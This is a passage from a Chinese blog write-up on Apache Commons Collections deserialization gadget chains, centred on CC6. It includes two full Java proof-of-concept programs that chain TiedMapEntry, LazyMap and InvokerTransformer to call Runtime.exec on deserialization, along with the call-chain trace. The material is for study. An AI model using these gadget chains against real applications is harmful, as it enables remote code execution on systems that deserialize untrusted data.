class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">Testtransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        Map map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map lazyMap=LazyMap.decorate(map,Testtransformer);<br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;test1&quot;</span>);<br><br>        HashSet hashSet=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>(<span class="hljs-number">1</span>);<br>        hashSet.add(tiedMapEntry);<br>        lazyMap.remove(<span class="hljs-string">&quot;test1&quot;</span>);<br><br>        <span class="hljs-comment">//通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(Testtransformer, transformers);<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;test.out&quot;</span>));<br>        objectOutputStream.writeObject(hashSet);<br>        objectOutputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;test.out&quot;</span>));<br>        objectInputStream.readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>那么前面的那段一直到LazyMap也是和我们的这个CC1是一样的,那么这里我们也是不多去说了</p>
<p>因为在这个地方我们可以看到我们还是使用了我们的这个TiedMapEntry,所以我们还是需要去关注会在哪儿代用到我们这个TiedMapEntry.getValue方法</p>
<p>这里我们看到这个地方:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">HashSet hashSet=new HashSet(1);<br>       hashSet.add(tiedMapEntry);<br>       lazyMap.remove(&quot;test1&quot;);<br></code></pre></td></tr></table></figure>

<p>那么这里将我们的这个tiedMapEntry添加到了我们的这个HashSet中去了</p>
<p>那么我们去它的readObject打上断点看看:</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220719193416816.png" alt="image-20220719193416816"></p>
<p>在<code>Hashset</code>的<code>readObject</code>方法中，会去调用<code>map</code>的<code>put</code>方法。这里的map为<code>Hashmap</code>的对象，所以这里调用的是<code>Hashmap</code>的<code>put</code>方法，跟进一下该方法。</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220719194359673.png" alt="image-20220719194359673"></p>
<p>而在这一步又会去调用<code>hash</code>方法并且传入<code>key</code>作为参数。还需要再跟进一下<code>hash</code>方法。</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220719194409982.png" alt="image-20220719194409982"></p>
<p>跟进到方法里面会发现，<strong>方法内部还会去调用<code>key</code>的<code>hashcode</code></strong>,而这里的<code>key</code>为<code>TiedMapEntry</code>的实例化对象。调用的则是<code>TiedMapEntry</code>的<code>hashcode</code>。跟进一下<code>hashcode</code>方法。</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220719194524444.png" alt="image-20220719194524444"></p>
<p>而在这个TiedEntryMap这个类的这个hashCode方法中:</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220719194601678.png" alt="image-20220719194601678"></p>
<p>我们发现它会去调用到我们的getValue方法</p>
<p><img src="https://picture11233.oss-cn-beijing.aliyuncs.com/blog/image-20220719194627515.png" alt="image-20220719194627515"></p>
<p>之后便是LazyMap的调用链了</p>
<p>这里在前面提到过，需要<code>lazyMap.remove</code>方法移除前面填入的<code>KEY</code>才能够进行到该if判断语句里面去执行<code>transform</code>方法，否则就直接走的是else的方法体内容了。达不到所要的效果，利用链也没法进行执行命令了。</p>
<p>总的来说CC6就是通过我们的HashSet的反序列化去触发我们利用链子的执行的,而CC5则是通过BadAttributeValueExpException</p>
<h3 id="利用链子"><a href="#利用链子" class="headerlink" title="利用链子:"></a>利用链子:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">HashSet.readObject()<br>	HashMap.put()<br>		HashMap.Hash()<br>			TiedMapEntry.hashCode()<br>				TiedMapEntry.getValue()<br>					LazyMap.get()<br>						transformerChain.transform()<br>							ConstantTransformer.transform()<br>								.........<br>									exec<br></code></pre></td></tr></table></figure>

<p>另外一个更简单的poc：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import org.apache.commons.collections.Transformer;<br>import org.apache.commons.collections.functors.ChainedTransformer;<br>import org.apache.commons.collections.functors.ConstantTransformer;<br>import org.apache.commons.collections.functors.InvokerTransformer;<br>import org.apache.commons.collections.keyvalue.TiedMapEntry;<br>import org.apache.commons.collections.map.LazyMap;<br><br>import java.io.*;<br>import java.lang.reflect.Field;<br>import java.util.HashMap;<br>import java.util.Map;<br>public class Test &#123;<br>    public static void main(String[] args) throws Exception &#123;<br>        Transformer[] transformers = new Transformer[]&#123;<br>                new ConstantTransformer(Runtime.class),<br>                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;),<br>                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),<br>                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class&#125;, new String[] &#123; &quot;calc.exe&quot; &#125;)<br>        &#125;;<br><br>        Transformer transformerChain = new ChainedTransformer(transformers);<br>        Map lazyMap=  LazyMap.decorate(new HashMap(), transformerChain);<br>        TiedMapEntry entry = new TiedMapEntry(new HashMap(),&quot;sakut2&quot;);<br><br>        HashMap hashMap = new HashMap();<br>        hashMap.put(entry,&quot;sakut2&quot;);<br><br>        Field field = entry.getClass().getDeclaredField(&quot;map&quot;);<br>        field.setAccessible(true);<br>        field.set(entry,lazyMap);<br><br>        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;CC6&quot;));<br>        oos.writeObject(hashMap);<br>        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;CC6&quot;));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">HashMap.readObject()<br>	TiedMapEntry.hashCode()<br>		LazyMap.get()<br>			ChainTransformer.transform()<br>				InvokerTransformer.transform()<br></code></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://zyyc0.github.io">zhangyuechuan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://zyyc0.github.io/2025/04/09/CC%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93/">https://zyyc0.github.io/2025/04/09/CC%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://zyyc0.github.io" target="_blank">zyyyc</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/123.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/04/08/CVE-2025-24813%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/" title="CVE-2025-24813详细分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">CVE-2025-24813详细分析</div></div><div class="info-2"><div class="info-item-1">前言：Tomcat 是一个开源的、轻量级的 Web 应用服务器 和 Servlet 容器。它由 Apache 软件基金会下的 Jakarta 项目开发，是目前最流行的 Java Web 服务器之一。 其官方已经公布的漏洞的详细情况：https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq  该漏洞的核心在于 Tomcat 在处理不完整PUT请求上传时，会使用一个基于用户提供的文件名和路径生成的临时文件。 如果满足以下所有条件，则恶意用户能够查看 安全敏感文件和&#x2F;或向这些文件注入内容： 1、为DefaultServlet 启用写的权限（默认禁用） 2、支持 partial PUT，能够将恶意的序列化数据写入到会话文件中（默认启用） 3、应用程序正在使用 Tomcat 的基于文件的会话持久性并且使用了默认的会话存储位置（默认存储位置） 4、含有反序列化的gadget 受影响版本  Apache Tomcat 11.0.0-M1 至 11.0.2 Apache Tomcat 10.1.0-M1 至...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/123.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">zhangyuechuan</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CC1"><span class="toc-number">1.</span> <span class="toc-text">CC1:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.1.</span> <span class="toc-text">利用链:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC2"><span class="toc-number">2.</span> <span class="toc-text">CC2:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE-1"><span class="toc-number">2.1.</span> <span class="toc-text">利用链:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC3"><span class="toc-number">3.</span> <span class="toc-text">CC3:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE-2"><span class="toc-number">3.1.</span> <span class="toc-text">利用链:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC4"><span class="toc-number">4.</span> <span class="toc-text">CC4:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC5"><span class="toc-number">5.</span> <span class="toc-text">CC5:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE-3"><span class="toc-number">5.1.</span> <span class="toc-text">利用链:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E5%88%A9%E7%94%A8%E9%93%BECC5k1-%E4%BF%9D%E7%95%99ChainedTransformer"><span class="toc-number">5.2.</span> <span class="toc-text">扩展利用链CC5k1(保留ChainedTransformer):</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E5%88%A9%E7%94%A8%E9%93%BECC5k2-%E4%B8%8D%E4%BF%9D%E7%95%99ChainedTransformer"><span class="toc-number">5.3.</span> <span class="toc-text">扩展利用链CC5k2(不保留ChainedTransformer):</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC6"><span class="toc-number">6.</span> <span class="toc-text">CC6:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%90"><span class="toc-number">6.1.</span> <span class="toc-text">利用链子:</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/09/CC%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93/" title="CC利用链总结">CC利用链总结</a><time datetime="2025-04-09T13:55:48.000Z" title="发表于 2025-04-09 21:55:48">2025-04-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/08/CVE-2025-24813%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/" title="CVE-2025-24813详细分析">CVE-2025-24813详细分析</a><time datetime="2025-04-08T14:50:24.000Z" title="发表于 2025-04-08 22:50:24">2025-04-08</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By zhangyuechuan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div><div class="footer_custom_text">Welcome to my place !</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>